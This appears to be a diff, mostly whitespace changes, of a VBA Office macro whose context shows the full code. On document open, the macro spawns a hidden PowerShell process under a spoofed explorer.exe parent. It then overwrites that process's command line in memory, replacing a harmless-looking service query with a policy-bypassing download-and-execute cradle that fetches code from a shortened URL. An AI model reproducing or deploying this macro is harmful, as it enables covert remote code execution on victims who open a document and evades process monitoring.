@@ -146,7 +146,7 @@ Const MAX_PATH = 260
 '''''''''''''''''''''''''''''''''''''''''''''''''''
 ''''''''''''''' Data types ''''''''''''''''''''''''
 '''''''''''''''''''''''''''''''''''''''''''''''''''
- 
+
 
 
 Private Type PROCESS_INFORMATION
@@ -177,7 +177,7 @@ Private Type STARTUP_INFO
     hStdOutput As LongPtr
     hStdError As LongPtr
 End Type
- 
+
 Private Type STARTUPINFOEX
     STARTUPINFO As STARTUP_INFO
     lpAttributelist As LongPtr
@@ -272,7 +272,7 @@ Private Declare PtrSafe Function OpenProcess Lib "kernel32.dll" ( _
     ByVal fInherit As Integer, _
     ByVal hObject As Long _
 ) As Long
- 
+
 
 Private Declare PtrSafe Function HeapAlloc Lib "kernel32.dll" ( _
     ByVal hHeap As LongPtr, _
@@ -306,12 +306,12 @@ Private Declare PtrSafe Function CreateToolhelp32Snapshot Lib "kernel32.dll" ( _
     ByVal dwFlags As Integer, _
     ByVal th32ProcessID As Integer _
 ) As Long
- 
+
 Private Declare PtrSafe Function Process32First Lib "kernel32.dll" ( _
     ByVal hSnapshot As LongPtr, _
     ByRef lppe As PROCESSENTRY32 _
 ) As Boolean
- 
+
 Private Declare PtrSafe Function Process32Next Lib "kernel32.dll" ( _
     ByVal hSnapshot As LongPtr, _
     ByRef lppe As PROCESSENTRY32 _
@@ -350,9 +350,9 @@ Public Function getPidByName(ByVal name As String) As Integer
     Dim snapshot As LongPtr
 
     snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, ByVal 0&)
- 
+
     continueSearching = Process32First(snapshot, pEntry)
- 
+
     Do
         If Left$(pEntry.szexeFile, Len(name)) = LCase$(name) Then
             getPidByName = pEntry.th32ProcessID
@@ -372,9 +372,9 @@ Public Function convertStr(ByVal str As String) As Byte()
         result(j + 1) = &H0
         j = j + 2
     Next
-    
+
     convertStr = result
-    
+
 End Function
 
 Sub AutoOpen()
@@ -385,9 +385,9 @@ Sub AutoOpen()
     Dim threadAttribSize As Integer
     Dim parentHandle As LongPtr
     Dim originalCli As String
-    
+
     originalCli = "powershell.exe -NoExit -c Get-Service -DisplayName '*network*' | Where-Object { $_.Status -eq 'Running' } | Sort-Object DisplayName"
-    
+
     ' Get a handle on the process to be used as a parent
     pid = getPidByName("explorer.exe")
     parentHandle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
@@ -402,7 +402,7 @@ Sub AutoOpen()
 
     ' Set the size of cb (see https://docs.microsoft.com/en-us/windows/desktop/api/winbase/ns-winbase-_startupinfoexa#remarks)
     si.STARTUPINFO.cb = LenB(si)
-    
+
     ' Hide new process window
     si.STARTUPINFO.dwFlags = 1
     si.STARTUPINFO.wShowWindow = SW_HIDE
@@ -419,7 +419,7 @@ Sub AutoOpen()
         VarPtr(si), _
         pi _
     )
-    
+
     ' Spoofing of cli arguments
     Dim size As Long
     Dim PEB As PEB
@@ -429,17 +429,17 @@ Sub AutoOpen()
     Dim parameters As RTL_USER_PROCESS_PARAMETERS
     Dim cmdStr As String
     Dim cmd() As Byte
-    
+
     newProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, False, pi.dwProcessId)
     result = NtQueryInformationProcess(newProcessHandle, 0, pbi, Len(pbi), size)
     success = ReadProcessMemory(newProcessHandle, pbi.PEBBaseAddress, VarPtr(PEB), Len(PEB), size)
     ' peb.ProcessParameters now contains the address to the parameters - read them
     success = ReadProcessMemory(newProcessHandle, PEB.ProcessParameters, VarPtr(parameters), Len(parameters), size)
-    
+
     cmdStr = "powershell.exe -noexit -ep bypass -c IEX((New-Object System.Net.WebClient).DownloadString('http://bit.ly/2TxpA4h')) # "
     cmd = convertStr(cmdStr)
     success = WriteProcessMemory(newProcessHandle, parameters.CommandLine.Buffer, StrPtr(cmd), 2 * Len(cmdStr), size)
-    ResumeThread (pi.hThread) 
+    ResumeThread (pi.hThread)
 End Sub
 ```
 
